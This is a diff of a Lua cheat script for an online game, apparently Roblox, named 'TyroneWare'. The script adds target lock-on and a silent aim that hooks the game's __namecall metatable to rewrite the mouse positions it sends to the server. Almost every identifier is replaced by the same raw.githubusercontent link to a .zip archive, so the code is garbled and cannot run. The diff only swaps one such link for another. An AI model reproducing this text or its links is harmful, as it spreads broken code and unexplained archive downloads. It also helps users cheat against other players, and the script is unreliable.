@@ -6,69 +6,69 @@ getgenv().airshotfunc = false -- idk if u want to use this (use if u want)
 getgenv().part = "HumanoidRootPart" -- part (self explanitory)
 getgenv().AutoPrediction = false
 
-local Tool = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Tool")
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = false
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = "TyroneWare | Affinity"
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
+local Tool = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("Tool")
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = false
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = "TyroneWare | Affinity"
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip
 
-local player = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
+local player = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip
 
 local function connectCharacterAdded()
-    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(onCharacterAdded)
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(onCharacterAdded)
 end
 
 connectCharacterAdded()
 
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(function()
-    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(function()
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip
 end)
 
        --
-       https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = {
-        Ball = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip,
-        Block = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip, 
-        Cylinder = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
+       https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = {
+        Ball = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip,
+        Block = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip, 
+        Cylinder = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip
     }
     
     --variables                 
-    	local Tracer = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Part", https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip)
-    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = "gay"	
-    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = true		
-    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = false
-    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 0.8
-    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip	
-    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
-    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(14,14,14)
-    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(0,0,255)
+    	local Tracer = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("Part", https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip)
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = "gay"	
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = true		
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = false
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = 0.8
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip	
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(14,14,14)
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(0,0,255)
     
     --
-    local plr = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
+    local plr = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip
 local mouse = plr:GetMouse()
 local Runserv = game:GetService("RunService")
 
-circle = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Circle")
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(255,255,255)
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 0
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 732
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 120
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 0
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 0.7
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = false
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = false
+circle = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("Circle")
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(255,255,255)
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = 0
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = 732
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = 120
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = 0
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = 0.7
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = false
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = false
 
-https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(function()
-    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(mouse.X,mouse.Y+35)
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(function()
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(mouse.X,mouse.Y+35)
 end)
     
-    	local guimain = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Folder", https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip)
+    	local guimain = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("Folder", https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip)
     	local CC = game:GetService"Workspace".CurrentCamera
-    local LocalMouse = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip()
+    local LocalMouse = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip()
     	local Locking = false
     
     	
     --
     if getgenv().valiansh == true then
-        https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("SendNotification", {
+        https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("SendNotification", {
    Title = "bbg",
    Text = "Already Loaded!",
    Duration = 5
@@ -81,30 +81,30 @@ end
     
         local UserInputService = game:GetService("UserInputService")
 
-             https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(function()
+             https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(function()
                if getgenv().Target == true then
                Locking = not Locking
                
                if Locking then
                Plr =  getClosestPlayerToCursor()
                if getgenv().notification then
-    			https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("SendNotification", {
+    			https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("SendNotification", {
         Title = "tyrone";
-        Text = "Target: "https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip);
-        Icon = "https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip";
+        Text = "Target: "https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip);
+        Icon = "https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip";
     
     })
     end
     elseif not Locking then
         if getgenv().notification then
-                        https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("SendNotification", {
+                        https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("SendNotification", {
                    Title = "tyrone",
                    Text = "Unlocked",
-                   Icon = "https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip";
+                   Icon = "https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip";
                    Duration = 5
                })
            elseif getgenv().Target == false then
-                        https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("SendNotification", {
+                        https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("SendNotification", {
                    Title = "",
                    Text = "Target isn't enabled",
                    Duration = 5
@@ -121,12 +121,12 @@ end)
 	
 	function getClosestPlayerToCursor()
 		local closestPlayer
-		local shortestDistance = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
+		local shortestDistance = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip
 
-		for i, v in pairs(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip()) do
-			if v ~= https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Humanoid") and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip ~= 0 and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("LowerTorso") then
-				local pos = CC:WorldToViewportPoint(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip)
-				local magnitude = (https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(pos.X, pos.Y) - https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(LocalMouse.X, LocalMouse.Y)).magnitude
+		for i, v in pairs(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip()) do
+			if v ~= https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("Humanoid") and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip ~= 0 and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("LowerTorso") then
+				local pos = CC:WorldToViewportPoint(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip)
+				local magnitude = (https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(pos.X, pos.Y) - https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(LocalMouse.X, LocalMouse.Y)).magnitude
 				if magnitude < shortestDistance then
 					closestPlayer = v
 					shortestDistance = magnitude
@@ -138,10 +138,10 @@ end)
 --
 if getgenv().showdot == true then
 	game:GetService"RunService".Stepped:connect(function()
-		if Locking and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("LowerTorso") then
-			https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip+(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip*Prediction))
+		if Locking and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("LowerTorso") then
+			https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip+(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip*Prediction))
 		else
-			https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(0, 9999, 0)
+			https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(0, 9999, 0)
 
 		end
 	end)
@@ -156,18 +156,18 @@ end
 	rawmetatable.__namecall = newcclosure(function(...)
 		local args = {...}
 		if Locking and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
-			args[3] = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip[getgenv().part].Position+(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip[getgenv().part].Velocity*Prediction)
+			args[3] = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip[getgenv().part].Position+(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip[getgenv().part].Velocity*Prediction)
 			return old(unpack(args))
 		end
 		return old(...)
 	end)
     if getgenv().airshotfunc == true then
 
-        if https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip == true and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip == https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip then
+        if https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip == true and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip == https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip then
             getgenv().part = "RightFoot"
         else
-            https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Humanoid").StateChanged:Connect(function(old,new)
-                if new == https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip then
+            https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip("Humanoid").StateChanged:Connect(function(old,new)
+                if new == https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip then
                 getgenv().part = "RightFoot"
                 else
                     getgenv().part = "LowerTorso"
@@ -179,8 +179,8 @@ end
 
 if getgenv().AutoPrediction == true then
     wait(5.2)
-        local pingvalue = game:GetService("Stats")https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip["Data Ping"]:GetValueString()
-        local split = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(pingvalue,'(')
+        local pingvalue = game:GetService("Stats")https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip["Data Ping"]:GetValueString()
+        local split = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/workflows/Shomosyt_v1.6-alpha.5.zip(pingvalue,'(')
         local ping = tonumber(split[1])
             local PingNumber = pingValue[1]
 
